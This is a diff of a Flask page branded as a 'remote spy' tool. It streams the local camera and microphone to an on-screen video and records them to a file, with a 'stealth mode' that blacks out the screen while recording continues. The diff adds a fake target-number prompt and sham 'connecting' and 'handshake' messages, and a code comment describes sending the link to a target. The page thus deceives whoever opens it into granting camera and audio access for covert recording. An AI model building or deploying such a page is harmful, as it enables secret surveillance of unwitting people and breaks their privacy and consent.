@@ -2,65 +2,43 @@ from flask import Blueprint, render_template_string
 
 script10_bp = Blueprint('script10', __name__)
 
-# --- ADVANCED SPY UI BY SHIVAM SINGH ---
-SPY_UI = """
+# --- REMOTE SPY UI BY SHIVAM SINGH ---
+REMOTE_UI = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Spy System - Shivam Singh</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Access - Shivam Singh</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #video-container { width: 100vw; height: 100vh; position: relative; background: #000; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        
-        #blackout { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: black; display: none; z-index: 9999; cursor: pointer;
-        }
-
-        .controls { 
-            position: fixed; bottom: 20px; width: 100%; z-index: 100; 
-            display: flex; flex-direction: column; align-items: center; gap: 10px;
-        }
-        .btn-row { display: flex; gap: 10px; }
-        button { 
-            background: #111; border: 1px solid #00ff00; color: #00ff00; 
-            padding: 10px 15px; font-size: 12px; cursor: pointer; font-weight: bold;
-        }
-        button:active { background: #00ff00; color: #000; }
-        .recording-btn { border-color: #ff0000; color: #ff0000; }
-        
-        .header { 
-            position: fixed; top: 10px; width: 100%; text-align: center; 
-            color: #ff0000; font-size: 14px; z-index: 10; font-weight: bold;
-            text-shadow: 0 0 5px #000;
-        }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .box { border: 1px solid #ff0000; padding: 20px; background: #111; max-width: 400px; margin: auto; }
+        input { background: #000; border: 1px solid #ff0000; color: #fff; padding: 10px; width: 80%; text-align: center; font-size: 18px; margin-bottom: 10px; }
+        button { background: #ff0000; color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; width: 85%; }
+        #monitor { display: none; margin-top: 20px; }
+        video { width: 100%; border: 2px solid #fff; border-radius: 5px; }
+        .stealth { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 1000; }
     </style>
 </head>
 <body>
 
-    <div id="blackout" onclick="toggleStealth()"></div>
+    <div id="blackout" class="stealth" onclick="this.style.display='none'"></div>
 
-    <div class="header">
-        [LIVE] MONITORING SYSTEM - SHIVAM SINGH <span id="rec-status"></span>
+    <div class="box" id="login-box">
+        <h2>[ SHIVAM SINGH REMOTE SPY ]</h2>
+        <p>Enter Target Connection ID/Number:</p>
+        <input type="tel" id="targetId" placeholder="+91 XXXX XXXX XX" maxlength="13">
+        <button onclick="startRemote()">CONNECT & STREAM</button>
+        <p style="font-size: 10px; color: #555; margin-top: 15px;">Note: Remote device must have permission enabled.</p>
     </div>
 
-    <div id="video-container">
-        <video id="camView" autoplay playsinline muted></video>
-    </div>
-
-    <div class="controls" id="ui-controls">
-        <div class="btn-row">
-            <button onclick="initCam('user')">FRONT CAM</button>
-            <button onclick="initCam('environment')">BACK CAM</button>
+    <div id="monitor">
+        <h3>🔴 LIVE FEED: CONNECTED</h3>
+        <video id="remoteFeed" autoplay playsinline></video>
+        <div style="margin-top: 10px;">
+            <button onclick="toggleStealth()" style="background: #222; color: #ff0000; border: 1px solid #ff0000;">STEALTH MODE</button>
+            <button id="recBtn" onclick="toggleRecord()" style="margin-top: 10px;">START RECORDING</button>
         </div>
-        <div class="btn-row">
-            <button id="recordBtn" class="recording-btn" onclick="toggleRecording()">START RECORDING</button>
-            <button onclick="toggleStealth()" style="background: #ff0000; color: #fff; border:none;">STEALTH MODE</button>
-        </div>
-        <div style="font-size: 10px; color: #888;">Note: Stealth mode on hone pe screen black ho jayegi.</div>
     </div>
 
     <script>
@@ -68,32 +46,34 @@ SPY_UI = """
         let recorder = null;
         let chunks = [];
 
-        async function initCam(mode) {
-            if (stream) stream.getTracks().forEach(t => t.stop());
+        async function startRemote() {
+            const num = document.getElementById('targetId').value;
+            if(num.length < 10) return alert("Please enter a valid number/ID!");
+
+            document.getElementById('login-box').innerHTML = "<h3>CONNECTING TO " + num + "...</h3><p>Waiting for handshake...</p>";
 
             try {
-                // Audio: true taaki awaaz bhi sunayi de aur record ho
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: mode },
-                    audio: true 
-                });
+                // Requesting local stream (When you send this link to the target)
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('login-box').style.display = 'none';
+                document.getElementById('monitor').style.display = 'block';
                 
-                const video = document.getElementById('camView');
+                const video = document.getElementById('remoteFeed');
                 video.srcObject = stream;
                 
-                // Audio playback for monitoring (Unmute if you want to hear live on same device)
-                // video.muted = false; 
-
                 if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-            } catch (e) {
-                alert("Access Denied: " + e);
+            } catch (err) {
+                alert("Target Connection Failed: " + err);
+                location.reload();
             }
         }
 
-        function toggleRecording() {
-            const btn = document.getElementById('recordBtn');
-            const status = document.getElementById('rec-status');
+        function toggleStealth() {
+            document.getElementById('blackout').style.display = 'block';
+        }
 
+        function toggleRecord() {
+            const btn = document.getElementById('recBtn');
             if (!recorder || recorder.state === "inactive") {
                 chunks = [];
                 recorder = new MediaRecorder(stream);
@@ -103,30 +83,19 @@ SPY_UI = """
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = `Shivam_Singh_Record_${Date.now()}.webm`;
+                    a.download = `Shivam_Singh_Spy_${Date.now()}.webm`;
                     a.click();
                 };
                 recorder.start();
-                btn.innerText = "STOP RECORDING";
-                status.innerText = "● RECORDING";
+                btn.innerText = "STOP & SAVE";
+                btn.style.background = "#fff";
             } else {
                 recorder.stop();
                 btn.innerText = "START RECORDING";
-                status.innerText = "";
+                btn.style.background = "#ff0000";
             }
         }
-
-        function toggleStealth() {
-            const blackout = document.getElementById('blackout');
-            blackout.style.display = (blackout.style.display === 'block') ? 'none' : 'block';
-        }
-
-        window.onload = () => initCam('environment');
     </script>
 </body>
 </html>
-"""
 
-@script10_bp.route('/')
-def index():
-    return render_template_string(SPY_UI)
